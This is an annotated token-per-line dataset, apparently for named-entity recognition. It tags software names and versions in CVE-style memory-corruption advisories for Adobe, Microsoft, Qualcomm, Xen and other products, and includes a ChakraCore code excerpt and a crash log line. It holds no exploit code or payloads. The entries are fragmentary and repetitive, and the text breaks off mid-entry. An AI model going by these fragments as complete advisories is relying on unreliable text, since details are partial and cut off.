An O
issue O
was O
discovered O
in O
Adobe SN
InDesign SN
12.1.0 SV
and SV
earlier SV
versions O
. O

An O
issue O
was O
discovered O
in O
Adobe SN
Digital SN
Editions SN
4.5.6 SV
and SV
earlier SV
versions O
. O

An O
exploitable O
memory O
corruption O
vulnerability O
exists O
, O
which O
could O
lead O
to O
disclosure O
of O
memory O
addresses O
. O

An O
issue O
was O
discovered O
in O
Adobe SN
Shockwave SN
12.2.9.199 SV
and SV
earlier SV
. O

This O
affects O
26.0.0.151 SV
and SV
earlier SV
. O

Adobe O
Flash O
Player O
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
MP4 O
atom O
parser O
. O

Adobe O
Flash O
- O
Out-of-Bounds O
Read O
in O
applyToRange O

Adobe O
Flash O
Player O
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
text O
handling O
function O
. O

Source O
: O
attached O
MP4 O
file O
causes O
an O
out-of-bounds O
memory O
access O
when O
played O
in O
flash O
player O
. O

Adobe O
Flash O
- O
Out-of-Bounds O
Memory O
Read O
in O
MP4 O
Parsing O

Source O
: O
attached O
fuzzed O
MP4 O
file O
causes O
an O
out-of-bounds O
memory O
access O
when O
played O
with O
Adobe O
Flash O
Proof O
of O
Concept O
: O

Adobe O
Flash O
- O
Out-of-Bounds O
Write O
in O
MP4 O
Edge O
Processing O

Adobe SN
Digital SN
Editions SN
4.5.4 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
transfer O
of O
pixel O
blocks O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
data O
representing O
icons O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
image O
stream O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
JPEG O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
data O
interpreted O
as O
JPEG O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Adobe O
Graphics O
Manager O
module O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
internal O
data O
structure O
manipulation O
related O
to O
document O
encoding O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
drawing O
ASCII O
text O
string O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
data O
and O
the O
embedded O
TIF O
image O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
data O
and O
the O
embedded O
GIF O
image O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
TIFF O
color O
map O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
Adobe O
Graphics O
Manager O
( O
AGM O
) O
module O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JPEG O
2000 O
parsing O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
parsing O
an O
invalid O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
record O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
pixel O
block O
transfer O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
parsing O
JPEG O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
private O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
transformation O
of O
blocks O
of O
pixels O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
line O
segments O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
text O
strings O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
curve O
drawing O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
font O
parsing O
module O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
internal O
handling O
of O
UTF-16 O
literal O
strings O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
block O
transfer O
of O
pixels O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
JPEG O
2000 O
engine O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
JPEG O
2000 O
( O
JP2 O
) O
code O
stream O
data O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
processing O
engine O
when O
processing O
JPEG O
2000 O
( O
JP2 O
) O
code O
stream O
data O
. O

An O
issue O
was O
discovered O
in O
Adobe SN
Flash SN
Player SN
27.0.0.183 SV
and SV
earlier SV
versions SV
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
Primetime O
SDK O
metadata O
functionality O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
drawing O
of O
Unicode O
text O
strings O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
bitmap O
transformations O
. O

This O
vulnerability O
is O
an O
instance O
of O
a O
use O
after O
free O
vulnerability O
in O
the O
Primetime O
SDK O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
rendering O
a O
path O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
image O
conversion O
engine O
when O
processing O
Enhanced O
Metafile O
Format O
( O
EMF O
) O
data O
related O
to O
text O
output O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
in O
the O
font O
parsing O
, O
where O
the O
font O
is O
embedded O
in O
the O
XML O
Paper O
Specification O
( O
XPS O
) O
file O
. O

Adobe SN
Acrobat SN
Reader SN
2017.009.20058 SV
and SV
earlier SV
, O
2017.008.30051 SV
and SV
earlier SV
, O
2015.006.30306 SV
and SV
earlier SV
, O
and SV
11.0.20 SV
and SV
earlier SV
has O
an O
exploitable O
memory O
corruption O
vulnerability O
that O
occurs O
when O
reading O
a O
JPEG O
file O
embedded O
within O
XML O
Paper O
Specification O
( O
XPS O
) O
file O
. O

In O
android O
for O
MSM O
, O
Firefox O
OS O
for O
MSM O
, O
QRD O
Android O
, O
with O
all O
Android O
releases O
from O
CAF O
using O
the O
Linux O
kernel O
, O
due O
to O
a O
race O
condition O
in O
the O
function O
audio_effects_shared_ioctl O
( O
) O
, O
memory O
corruption O
can O
occur O
. O

In O
all O
Qualcomm O
products O
with O
Android O
releases O
from O
CAF O
using O
the O
Linux O
kernel O
, O
concurrent O
calls O
into O
ioctl O
RMNET_IOCTL_ADD_MUX_CHANNEL O
in O
ipa O
wan O
driver O
may O
lead O
to O
memory O
corruption O
due O
to O
missing O
locks O
. O

The O
grant-table O
feature O
in O
Xen SN
through SV
4.8.x SV
does O
not O
ensure O
sufficient O
type O
counts O
for O
a O
GNTMAP_device_map O
and O
GNTMAP_host_map O
mapping O
, O
which O
allows O
guest O
OS O
users O
to O
cause O
a O
denial O
of O
service O
( O
count O
mismanagement O
and O
memory O
corruption O
) O
or O
obtain O
privileged O
host O
OS O
access O
, O
aka O
XSA-224 O
bug O
2 O
. O

grant-table O
feature O
in O
Xen SN
through SV
4.8.x SV
mishandles O
a O
GNTMAP_device_map O
and O
GNTMAP_host_map O
mapping O
, O
when O
followed O
by O
only O
a O
GNTMAP_host_map O
unmapping O
, O
which O
allows O
guest O
OS O
users O
to O
cause O
a O
denial O
of O
service O
( O
count O
mismanagement O
and O
memory O
corruption O
) O
or O
obtain O
privileged O
host O
OS O
access O
, O
aka O
XSA-224 O
bug O
1 O
. O

Memory O
corruption O
vulnerability O
in O
Rakuraku SN
Hagaki SN
( O
Rakuraku O
Hagaki O
2018 SV
, O
Rakuraku SN
Hagaki SN
2017 SV
, O
Rakuraku SN
Hagaki SN
2016 SV
) O
and O
Rakuraku O
Hagaki O
Select O
for O
Ichitaro SN
( O
Ichitaro O
2017 O
, O
Ichitaro O
2016 SV
, O
Ichitaro SN
2015 SV
, O
Ichitaro O
Pro3 O
, O
Ichitaro O
Pro2 O
, O
Ichitaro O
Pro O
, O
Ichitaro SN
2011 SV
, O
Ichitaro SN
Government SV
8 SV
, O
Ichitaro SN
Government SV
7 SV
, O
Ichitaro SN
Government SV
6 SV
and O
Ichitaro SN
2017 SV
Trial SV
version SV
) O
allows O
attackers O
to O
execute O
arbitrary O
code O
with O
privileges O
of O
the O
application O
via O
specially O
crafted O
file O
. O

A O
vulnerability O
in O
the O
OpenOffice SN
Writer SN
DOC SN
file SN
parser SN
before SV
4.1.4 SV
, O
and O
specifically O
in O
the O
WW8Fonts O
Constructor O
, O
allows O
attackers O
to O
craft O
malicious O
documents O
that O
cause O
denial O
of O
service O
( O
memory O
corruption O
and O
application O
crash O
) O
potentially O
resulting O
in O
arbitrary O
code O
execution O
. O

In O
all O
Qualcomm O
products O
with O
Android SN
releases O
from SV
CAF SV
using O
the O
Linux O
kernel O
, O
in O
a O
video O
driver O
, O
memory O
corruption O
can O
potentially O
occur O
due O
to O
lack O
of O
bounds O
checking O
in O
a O
memcpy O
( O
) O
. O

An O
uninitialized O
stack O
variable O
vulnerability O
in O
load_tic_series O
( O
) O
in O
set.c O
in O
gnuplot SN
5.2.rc1 SV
allows O
an O
attacker O
to O
cause O
Denial O
of O
Service O
( O
Segmentation O
fault O
and O
Memory O
Corruption O
) O
or O
possibly O
have O
unspecified O
other O
impact O
when O
a O
victim O
opens O
a O
specially O
crafted O
file O
. O

A O
memory O
corruption O
vulnerability O
has O
been O
identified O
( O
aka O
improper O
restriction O
of O
operations O
within O
the O
bounds O
of O
a O
memory O
buffer O
) O
, O
which O
may O
allow O
remote O
code O
execution O
. O

An O
issue O
was O
discovered O
in O
Fuji SN
Electric SN
V-Server SN
Version O
3.3.22.0 SV
and SV
prior SV
. O

An O
issue O
was O
discovered O
in O
Oniguruma SN
6.2.0 SV
, O
as O
used O
in O
Oniguruma-mod O
in O
Ruby SN
through SV
2.4.1 SV
and O
mbstring O
in O
PHP SN
through SV
7.1.5 SV
. O

A O
heap O
out-of-bounds O
write O
occurs O
in O
bitset_set_range O
( O
) O
during O
regular O
expression O
compilation O
due O
to O
an O
uninitialized O
variable O
from O
an O
incorrect O
state O
transition O
. O

An O
incorrect O
state O
transition O
in O
parse_char_class O
( O
) O
could O
create O
an O
execution O
path O
that O
leaves O
a O
critical O
local O
variable O
uninitialized O
until O
it O
used O
as O
an O
index O
, O
resulting O
in O
an O
out-of-bounds O
write O
memory O
corruption O
. O

A O
heap O
out-of-bounds O
write O
or O
read O
occurs O
in O
next_state_val O
( O
) O
during O
regular O
expression O
compilation O
. O

Octal O
numbers O
larger O
than O
0xff O
are O
not O
handled O
correctly O
in O
fetch_token O
( O
) O
and O
fetch_token_in_cc O
( O
) O
. O

Quick SN
Heal SN
Internet SN
Security SN
10.1.0.316 SV
, O
Quick SN
Heal SN
Total SN
Security SN
10.1.0.316 SV
, O
and O
Quick SN
Heal SN
AntiVirus SN
Pro SN
10.1.0.316 SV
are O
vulnerable O
to O
Memory O
Corruption O
while O
parsing O
a O
malformed O
Mach-O O
file O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
and O
CVE-2017-11764 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Microsoft O
Edge O
accesses O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
scripting O
engine O
handles O
objects O
in O
memory O
in O
Microsoft O
Edge O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

We O
can O
make O
it O
throw O
an O
exception O
simply O
by O
exhausting O
the O
stack O
. O

So O
in O
the O
case O
, O
the O
function O
body O
remains O
reseted O
( O
invalid O
) O
. O

void O
JavascriptFunction O
: O
:ReparseAsmJsModule O
( O
ScriptFunction O
functionRef O
) O
{ O
ParseableFunctionInfo O
functionInfo O
= O
( O
functionRef O
) O
- O
> O
GetParseableFunctionInfo O
( O
) O
; O
Assert O
( O
functionInfo O
) O
; O
functionInfo- O
> O
GetFunctionBody O
( O
) O
- O
> O
AddDeferParseAttribute O
( O
) O
; O
functionInfo- O
> O
GetFunctionBody O
( O
) O
- O
> O
ResetEntryPoint O
( O
) O
; O
functionInfo- O
> O
GetFunctionBody O
( O
) O
- O
> O
ResetInParams O
( O
) O
; O
FunctionBody O
funcBody O
= O
functionInfo- O
> O
Parse O
( O
functionRef O
) O
; O
if O
ENABLE_PROFILE_INFO O
This O
is O
the O
first O
call O
to O
the O
function O
, O
ensure O
dynamic O
profile O
info O
funcBody- O
> O
EnsureDynamicProfileInfo O
( O
) O
; O
endif O
( O
functionRef O
) O
- O
> O
UpdateUndeferredBody O
( O
funcBody O
) O
; O
} O
First O
, O
it O
resets O
the O
function O
body O
and O
then O
re-parses O
it O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
Edge O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8731 O
, O
CVE-2017-8734 O
, O
and O
CVE-2017-11766 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Microsoft O
Edge O
accesses O
objects O
in O
memory O
, O
aka O
Microsoft O
Edge O
Memory O
Corruption O
Vulnerability O
. O

chakra O
! O
JsUtil O
: O
:WeaklyReferencedKeyDictionary O
< O
Js O
: O
:DynamicType O
, O
Js O
: O
:DynamicType O
ptr64 O
, O
DefaultComparer O
< O
Js O
: O
:DynamicType O
const O
ptr64 O
> O
,1 O
> O
: O
:FindEntry O
< O
Js O
: O
:DynamicType O
> O
+0x41 O
: O
00007fff`e2b7c841 O
8b0c81 O
mov O
ecx O
, O
dword O
ptr O
[ O
rcx+rax O
4 O
] O
ds:0000023b`4a2ea4c4 O

Tested O
on O
Microsoft SN
Edge SN
40.15063.0.0 SV
, O
Microsoft SN
EdgeHTML SN
15.15063 SV
( O
Insider O
Preview O
) O
. O

Crash O
Log O
: O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

Failed O
to O
reproduce O
on O
Microsoft O
Edge O
38.14393.1066.0 O
, O
Microsoft O
EdgeHTML O
14.14393 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
and O
M O
icrosoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
due O
to O
the O
way O
that O
Microsoft O
browsers O
access O
objects O
in O
memory O
, O
aka O
Microsoft O
Browser O
Memory O
Corruption O
Vulnerability O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Internet O
Explorer O
accesses O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8747 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
CVE-2017-8756 O
, O
and O
CVE-2017-11764 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
and O
M O
icrosoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
browser O
JavaScript O
engines O
render O
content O
when O
handling O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8749 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
Internet O
Explorer O
accesses O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

A O
remote O
code O
execution O
vulnerability O
exists O
in O
Excel O
Services O
, O
Microsoft SN
Excel SN
2007 SV
Service SV
Pack SV
3 SV
, O
Microsoft SN
Excel SN
2010 SV
Service SV
Pack SV
2 SV
, O
Microsoft SN
Excel SN
2013 SV
Service SV
Pack SV
1 SV
, O
Microsoft SN
Excel SN
2013 SV
RT SV
Service SV
Pack SV
1 SV
, O
and O
Microsoft SN
Excel SN
2016 SV
when O
they O
fail O
to O
properly O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Office O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8630 O
, O
CVE-2017-8632 O
, O
and O
CVE-2017-8731 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
